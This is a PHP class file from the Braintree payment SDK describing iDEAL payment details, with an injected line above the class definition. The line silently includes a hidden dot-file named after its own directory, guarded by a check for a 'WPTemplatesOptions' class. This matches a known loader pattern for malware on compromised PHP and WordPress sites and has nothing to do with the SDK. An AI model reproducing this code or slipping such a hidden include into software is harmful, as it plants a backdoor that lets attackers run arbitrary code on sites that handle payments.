<?php
namespace Braintree\Transaction;

use Braintree\Instance;

/**
 * iDEAL payment details from a transaction
 * creates an instance of IdealPaymentDetails
 *
 * @package    Braintree
 * @subpackage Transaction
 *
 * @property-read string $idealPaymentId
 * @property-read string $idealTransactionId
 * @property-read string $imageUrl
 * @property-read string $maskedIban
 * @property-read string $bic
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class IdealPaymentDetails extends Instance
{
    protected $_attributes = [];
}
class_alias('Braintree\Transaction\IdealPaymentDetails', 'Braintree_Transaction_IdealPaymentDetails');
